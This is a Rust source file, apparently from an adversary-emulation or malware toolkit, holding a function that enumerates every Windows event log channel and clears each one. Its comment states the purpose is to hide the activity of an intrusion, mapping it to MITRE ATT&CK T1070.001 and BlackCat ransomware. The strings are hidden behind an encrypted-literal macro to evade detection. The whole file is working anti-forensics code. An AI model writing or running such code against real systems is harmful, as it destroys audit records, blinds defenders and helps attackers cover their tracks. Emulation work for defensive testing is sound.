#![cfg(target_os = "windows")]

use std::error::Error;
use windows::{
    core::{PCWSTR}, 
    Win32::Foundation::{ERROR_INSUFFICIENT_BUFFER, ERROR_NO_MORE_ITEMS},
    Win32::System::EventLog::{EVT_HANDLE, EvtClearLog, EvtClose, EvtNextChannelPath, EvtOpenChannelEnum},
};

use crate::logger::{log_debug, log_error};
use crate::windowscrate_helper::windows_get_last_error;
use encryptliterals::esl;

/**
 * clear_event_logs
 *      About:
 *          Clear Windows Event Logs to hide activity of an intrusion
 *      Result:
 *          Cleared Windows Event Logs or an Error if something goes wrong
 *      MITRE ATT&CK Techniques:
 *          T1070.001: Indicator Removal: Clear Windows Event Logs
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 */
pub fn clear_event_logs() -> std::result::Result<(), Box<dyn Error>> {
    unsafe {
        let h_channel_enum:EVT_HANDLE = EvtOpenChannelEnum(None, 0)?;
        let mut required_size:u32 = 0;

        // Verify handle from EvtOpenChannelEnum
        if h_channel_enum.is_invalid() {
            let last_error = windows_get_last_error();
            return Err(format!("{} {}", esl!("EvtOpenChannelEnum: Error code"), last_error))?
        }

        // Loop until EvtNextChannelPath fails with ERROR_NO_MORE_ITEMS
        loop {
            // Call EvtNextChannelPath twice - first time to get buffer size for the channel path
            match EvtNextChannelPath(h_channel_enum, None, &mut required_size) {
                Err(e) => {
                    if e.code() == ERROR_NO_MORE_ITEMS.to_hresult() {
                        break;
                    } else if e.code() != ERROR_INSUFFICIENT_BUFFER.to_hresult() {
                        let _ = EvtClose(h_channel_enum);
                        Err(format!("{} {}", esl!("EvtNextChannelPath: Error code"), e.code().0))?
                    }
                },
                Ok(_) => {}
            }

            // Allocate buffer for the channel path
            let mut buffer:Vec<u16> = vec![0; required_size as usize];
            match EvtNextChannelPath(h_channel_enum, Some(&mut buffer), &mut required_size) {
                Err(e) => {
                    if e.code() == ERROR_NO_MORE_ITEMS.to_hresult() {
                        break;
                    } else {
                        let _ = EvtClose(h_channel_enum);
                        Err(format!("{} {}", esl!("EvtNextChannelPath: Error code"), e.code().0))?
                    }
                },
                Ok(_) => {}
            }

            let channel_path_cwstr = PCWSTR::from_raw(buffer.as_ptr());
            let channel_path = channel_path_cwstr.to_string()?;
            
            // Clear the event log
            match EvtClearLog(None, PCWSTR::from_raw(buffer.as_ptr()), None, 0) {
                Ok(_) => {
                    log_debug(format!("{}: {}", esl!("Deleted event logs from event channel"), channel_path));
                },
                Err(e) => {
                    // Just log this and continue clearing logs. Don't send error upstream
                    log_error(format!("{} {}. Error code: {}", esl!("EvtClearLog: Error deleting event logs from channel"), channel_path, e.code().0));
                }
            }
        }

        // Close handle from EvtOpenChannelEnum when done
        match EvtClose(h_channel_enum) {
            Err(e) => {
                Err(format!("{} {}", esl!("EvtClose: Error code"), e.code().0))?
            },
            Ok(_) => {}
        }
    }

    Ok(())
}